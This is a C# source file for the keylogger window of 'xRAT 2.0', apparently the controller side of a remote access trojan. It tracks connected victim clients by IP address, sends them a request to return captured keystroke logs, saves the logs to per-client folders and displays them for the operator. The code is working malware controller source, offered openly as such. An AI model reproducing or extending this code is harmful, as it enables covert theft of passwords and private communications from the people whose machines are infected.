using System;
using System.IO;
using System.Windows.Forms;
using xServer.Core;
using xServer.Core.Misc;
using System.Threading;

namespace xServer.Forms
{
    public partial class FrmKeylogger : Form
    {
        private readonly Client _connectClient;
        private readonly ListViewColumnSorter _lvwColumnSorter;
        private readonly string _path;

        public FrmKeylogger(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmKl = this;
            _path = Path.Combine(Application.StartupPath,
                "Clients\\" + _connectClient.EndPoint.Address.ToString() + "\\Logs\\");
            InitializeComponent();

            _lvwColumnSorter = new ListViewColumnSorter();
            lstLogs.ListViewItemSorter = _lvwColumnSorter;
        }

        private void FrmKeylogger_Load(object sender, EventArgs e)
        {
            if (_connectClient != null)
            {
                this.Text = string.Format("xRAT 2.0 - Keylogger [{0}:{1}]", _connectClient.EndPoint.Address.ToString(),
                    _connectClient.EndPoint.Port.ToString());

                if (!Directory.Exists(_path))
                    Directory.CreateDirectory(_path);

                DirectoryInfo dicInfo = new DirectoryInfo(_path);

                FileInfo[] iFiles = dicInfo.GetFiles();

                foreach (FileInfo file in iFiles)
                {
                    lstLogs.Items.Add(new ListViewItem().Text = file.Name);
                }
            }
        }

        private void btnGetLogs_Click(object sender, EventArgs e)
        {
            btnGetLogs.Enabled = false;

            lstLogs.Items.Clear();

            new Core.Packets.ServerPackets.GetLogs().Execute(_connectClient);

            new Thread(() =>
            {
                while (!btnGetLogs.Enabled)
                {
                    if (FrmMain.Instance == null)
                        //Provide an escape from thread in the case of client-server disconnection, a possibly rare occurence
                        return;

                    Thread.Sleep(15);
                }

                FileInfo[] iFiles = new DirectoryInfo(_path).GetFiles();

                if (iFiles.Length == 0)
                    return;

                foreach (FileInfo file in iFiles)
                {
                    var file1 = file;
                    lstLogs.Invoke((MethodInvoker) delegate { lstLogs.Items.Add(new ListViewItem().Text = file1.Name); });
                }
            }).Start();
        }

        private void lstLogs_ItemActivate(object sender, EventArgs e)
        {
            wLogViewer.Navigate(Path.Combine(_path, lstLogs.SelectedItems[0].Text));
        }

        private void FrmKeylogger_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_connectClient.Value != null)
                _connectClient.Value.FrmKl = null;
        }

        private void lstLogs_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            // Determine if clicked column is already the column that is being sorted.
            if (e.Column == _lvwColumnSorter.SortColumn)
            {
                // Reverse the current sort direction for this column.
                if (_lvwColumnSorter.Order == SortOrder.Ascending)
                    _lvwColumnSorter.Order = SortOrder.Descending;
                else
                    _lvwColumnSorter.Order = SortOrder.Ascending;
            }
            else
            {
                // Set the column number that is to be sorted; default to ascending.
                _lvwColumnSorter.SortColumn = e.Column;
                _lvwColumnSorter.Order = SortOrder.Ascending;
            }

            // Perform the sort with these new sort options.
            lstLogs.Sort();
        }
    }
}